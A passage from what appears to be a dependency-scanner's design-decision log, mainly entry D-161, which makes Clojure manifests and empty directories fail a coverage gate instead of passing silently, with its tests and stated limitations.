`p = print`, or a message assembled in a variable and displayed later are not recognized, so a marker in
those shapes still scans (the failure mode is a false positive, never a missed call — the same
conservative direction as D-25/D-153/D-158). `raise` is deliberately not a display sink: exception
messages reach the operator through the URL strip instead (pillow's raise-message URL is covered there),
and treating raise arguments as inert text would be wrong for exceptions whose construction has side
effects. And this closes the class for setup.py only; the same displayed-instruction shape in other
grammars (a Rakefile `puts`, a PowerShell `Write-Host`) is unexamined here, disclosed rather than assumed
closed.

## D-161 — zero coverage is not a clean pass: Clojure gap names, and -require-project

**Trigger:** the swytchdb live scan (2026-08-28, four repos). `swytch.jepsen` — a Leiningen project whose
`project.clj` declares `org.postgresql:postgresql@42.7.4`, a JDBC driver carrying three real advisories —
produced `no supported projects found (nothing to scan)` at exit 0, with `-fail-on-incomplete` set. The
run's report framed this as "-fail-on-incomplete passes the zero-coverage case", a silent-failure shape.

**Verification narrowed the diagnosis.** The report's framing was half right. The D-59 machinery for
exactly this — a RECOGNIZED manifest no adapter can resolve is disclosed as incomplete coverage and fails
the coverage gate — already existed and works: a bare `pom.xml` under `-fail-on-incomplete` exits 3 today.
The jepsen miss was two absent table entries, not an absent mechanism: `project.clj` and `deps.edn` were
simply not in `gapManifestByName`, so a Clojure repo fell through to the nothing-to-scan clean exit. What
remained genuinely open was the OTHER zero-coverage shape, which D-59 cannot reach by design: a directory
with NO recognized manifest at all. That clean exit is deliberate (a full-send sweep across many repos must
not fail on an empty or Go-only one), but for a CI job pointed at a repo that MUST contain a project, a
deleted or renamed manifest is indistinguishable from a clean pass.

**The fix, in two parts matching the two shapes.** `project.clj` ("leiningen") and `deps.edn` ("clojure")
join the exact-name gap table — both extensions are general (.clj is any Clojure source, .edn any EDN
data), so name-only per the OPU-18 dedication rule. A jepsen-shaped repo now flows through the normal
pipeline: disclosed as incomplete coverage, a real JSON verdict emitted (previously: no output at all),
exit 3 under `-fail-on-incomplete`. And `-require-project`, opt-in, makes zero discovered projects fail
the run at exit 3 — in both discovery modes — instead of the clean nothing-to-scan pass. The default is
unchanged: sweeps still cross empty repos clean, and `-fail-on-incomplete` alone still passes a genuinely
empty directory, because nothing was expected there.

**Validation:** `d161_zero_coverage_test.go` — the jepsen shape (ungated: disclosed at exit 0; gated:
exit 3), the empty directory (clean by default and under `-fail-on-incomplete`; exit 3 under
`-require-project`, recursive and `-no-recursive` both), and `-require-project` passing on a real project.
Mutation-checked: reverting the two fix files fails all three new tests while the pre-existing suite is
untouched. Live-fired through the built binary on the original repro directories with the same results.
Full suite green (34 packages), `-race` clean on the touched packages, gofmt/vet silent.

Residual limitations: Homebrew formulae (the other unscanned swytchdb repo) are deliberately not added —
a formula is a distribution-integrity surface, not a dependency manifest, and `.rb` is any Ruby source, so
recognizing it would need real formula parsing, not a name-table entry; left as the narrower, speculative
ask the run's report itself judged it. Actually PARSING Maven/Clojars manifests (resolving the declared
dependencies against OSV's strong Maven data) remains ecosystem work of a different size, tracked as a
backlog item, not smuggled in here. And `-require-project` asserts only that at least one project or
recognized gap was discovered — it does not (and should not) judge how many, or which.
